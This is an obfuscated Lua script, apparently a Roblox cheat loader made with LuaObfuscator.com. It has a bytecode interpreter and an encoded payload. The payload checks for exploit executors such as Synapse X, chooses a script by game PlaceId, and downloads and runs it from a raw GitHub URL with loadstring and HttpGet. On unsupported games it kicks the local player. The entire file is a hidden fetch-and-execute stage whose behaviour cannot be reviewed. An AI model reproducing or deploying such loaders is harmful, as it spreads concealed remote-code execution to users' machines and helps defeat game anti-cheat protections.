--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 22) then
					if (Enum <= 10) then
						if (Enum <= 4) then
							if (Enum <= 1) then
								if (Enum > 0) then
									do
										return;
									end
								else
									Stk[Inst[2]] = Inst[3];
								end
							elseif (Enum <= 2) then
								local A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
							elseif (Enum > 3) then
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								Stk[Inst[2]]();
							end
						elseif (Enum <= 7) then
							if (Enum <= 5) then
								if (Inst[3] == "_ENV") then
									Stk[Inst[2]] = Env;
								else
									Stk[Inst[2]] = Env[Inst[3]];
								end
							elseif (Enum > 6) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum <= 8) then
							Stk[Inst[2]] = {};
						elseif (Enum > 9) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
						end
					elseif (Enum <= 16) then
						if (Enum <= 13) then
							if (Enum <= 11) then
								Stk[Inst[2]] = Stk[Inst[3]];
							elseif (Enum == 12) then
								VIP = Inst[3];
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum <= 14) then
							do
								return;
							end
						elseif (Enum > 15) then
							Stk[Inst[2]] = Inst[3] ~= 0;
						else
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						end
					elseif (Enum <= 19) then
						if (Enum <= 17) then
							Stk[Inst[2]]();
						elseif (Enum == 18) then
							local A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
						else
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					elseif (Enum <= 20) then
						for Idx = Inst[2], Inst[3] do
							Stk[Idx] = nil;
						end
					elseif (Enum == 21) then
						if not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 33) then
					if (Enum <= 27) then
						if (Enum <= 24) then
							if (Enum == 23) then
								if (Inst[3] == "_ENV") then
									Stk[Inst[2]] = Env;
								else
									Stk[Inst[2]] = Env[Inst[3]];
								end
							else
								Env[Inst[3]] = Stk[Inst[2]];
							end
						elseif (Enum <= 25) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						elseif (Enum > 26) then
							if (Stk[Inst[2]] == Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					elseif (Enum <= 30) then
						if (Enum <= 28) then
							if (Stk[Inst[2]] == Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > 29) then
							Env[Inst[3]] = Stk[Inst[2]];
						else
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						end
					elseif (Enum <= 31) then
						local A = Inst[2];
						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
						Top = (Limit + A) - 1;
						local Edx = 0;
						for Idx = A, Top do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					elseif (Enum == 32) then
						if Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						local A = Inst[2];
						local Results = {Stk[A]()};
						local Limit = Inst[4];
						local Edx = 0;
						for Idx = A, Limit do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					end
				elseif (Enum <= 39) then
					if (Enum <= 36) then
						if (Enum <= 34) then
							if (Stk[Inst[2]] == Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum == 35) then
							Stk[Inst[2]] = Stk[Inst[3]];
						else
							Stk[Inst[2]] = Inst[3] ~= 0;
						end
					elseif (Enum <= 37) then
						local B = Inst[3];
						local K = Stk[B];
						for Idx = B + 1, Inst[4] do
							K = K .. Stk[Idx];
						end
						Stk[Inst[2]] = K;
					elseif (Enum > 38) then
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
					else
						local A = Inst[2];
						local Results = {Stk[A]()};
						local Limit = Inst[4];
						local Edx = 0;
						for Idx = A, Limit do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					end
				elseif (Enum <= 42) then
					if (Enum <= 40) then
						Stk[Inst[2]] = {};
					elseif (Enum == 41) then
						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
					elseif (Stk[Inst[2]] == Inst[4]) then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 43) then
					Stk[Inst[2]] = Inst[3];
				elseif (Enum > 44) then
					local B = Inst[3];
					local K = Stk[B];
					for Idx = B + 1, Inst[4] do
						K = K .. Stk[Idx];
					end
					Stk[Inst[2]] = K;
				elseif Stk[Inst[2]] then
					VIP = VIP + 1;
				else
					VIP = Inst[3];
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
VMCall("LOL!363O0003043O007461736B03043O007761697403043O0067616D6503083O0049734C6F6164656403073O0073796E617073652O033O0073796E03073O007265717565737403043O00756E633103043O00682O747003043O00756E6332030C3O00682O74705F7265717565737403043O00756E633303083O0073796E617061736503093O0053796E617073652058030B3O005363726970742D57617265030C3O00555750204578656375746F7203103O006964656E746966796578656375746F72028O0003063O00612O7365727403403O00556E73752O706F72746564206578656375746F723F3A204D692O73696E67202F204D69736D61746368696E6720526571756573742046756E6374696F6E28732903043O007761726E03093O006578656375746F723A03073O00506C6163654964026O00564003083O0066417A364E4A4744026O00364003083O006376386D34523854022O00902B2C27044203083O0044635A63476A7232022O00E0A918D3074203083O0075424D347A457154022O009010B49AF94103093O0061386136764A696D68023O008AD8BDC34103043O002O6C2O62022O0040432O88F54103043O005443615503373O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F417173796E2F776F726B73706163652F6D61696E2F030A3O006C6F6164737472696E6703073O00482O7470476574030A3O0077726F6E67322E6C756103053O007072696E74030F3O006C6F6164737472696E6720646F6E6503083O0046612O6C2E6C756103073O006474682E6C756103073O006C2O622E6C756103023O005F4703103O006B4172364C523654386873334A7367612O0103093O005463616E552E6C756103073O00506C6179657273030B3O004C6F63616C506C6179657203043O004B69636B03063O0077726F6E673F00C03O0012173O00013O00200F5O00022O00033O000100010012173O00033O0020065O00042O00123O0002000200062C5O00013O0004165O00012O00085O0004001217000100063O00062C0001000E00013O0004163O000E0001001217000100063O00200F00010001000700101D3O00050001001217000100093O00062C0001001400013O0004163O00140001001217000100093O00200F00010001000700101D3O000800010012170001000B3O00101D3O000A0001001217000100073O00101D3O000C00012O0009000100013O00200F00023O000D00062C0002002800013O0004163O0028000100200F00023O000800061500020028000100010004163O0028000100200F00023O000A00061500020028000100010004163O0028000100200F00023O000C00061500020028000100010004163O0028000100122O0001000E3O0004163O003D000100200F00023O000800062C0002003300013O0004163O0033000100200F00023O000A00061500020033000100010004163O0033000100200F00023O000C00061500020033000100010004163O0033000100122O0001000F3O0004163O003D000100200F00023O00080006150002003C000100010004163O003C000100200F00023O000A0006150002003C000100010004163O003C000100200F00023O000C00062C0002003D00013O0004163O003D000100122O000100103O001217000200114O002100020001000300062C0003004300013O0004163O0043000100062200030044000100020004163O0044000100122O000300123O001217000400134O0023000500013O00122O000600144O001A000400060001001217000400153O00122O000500164O0023000600014O001A000400060001001217000400033O00200F00040004001700261B00040053000100180004163O005300012O0024000500013O00121E000500193O0004163O007F000100261B000400580001001A0004163O005800012O0024000500013O00121E0005001B3O0004163O007F000100261B0004005D0001001C0004163O005D00012O0024000500013O00121E0005001D3O0004163O007F000100261B000400620001001E0004163O006200012O0024000500013O00121E0005001F3O0004163O007F000100261B00040067000100200004163O006700012O0024000500013O00121E000500213O0004163O007F000100261B0004006C000100220004163O006C00012O0024000500013O00121E000500233O0004163O007F000100261B00040071000100240004163O007100012O0024000500013O00121E000500253O0004163O007F000100122O000500263O001217000600273O001217000700033O0020060007000700282O0023000900053O00122O000A00294O002500090009000A2O001F000700094O000A00063O00022O00030006000100010012170006002A3O00122O0007002B4O0023000800044O001A000600080001001217000500153O00122O000600174O0023000700044O001A00050007000100122O000500263O0012170006001D3O00062C0006009000013O0004163O00900001001217000600273O001217000700033O0020060007000700282O0023000900053O00122O000A002C4O002500090009000A2O001F000700094O000A00063O00022O0003000600010001001217000600213O00062C0006009C00013O0004163O009C0001001217000600273O001217000700033O0020060007000700282O0023000900053O00122O000A002D4O002500090009000A2O001F000700094O000A00063O00022O0003000600010001001217000600233O00062C000600A800013O0004163O00A80001001217000600273O001217000700033O0020060007000700282O0023000900053O00122O000A002E4O002500090009000A2O001F000700094O000A00063O00022O0003000600010001001217000600253O00062C000600BF00013O0004163O00BF00010012170006002F3O00200F00060006003000261B000600B9000100310004163O00B90001001217000600273O001217000700033O0020060007000700282O0023000900053O00122O000A00324O002500090009000A2O001F000700094O000A00063O00022O00030006000100010004163O00BF0001001217000600033O00200F00060006003300200F00060006003400200600060006003500122O000800364O001A0006000800012O00013O00017O00", GetFEnv(), ...);
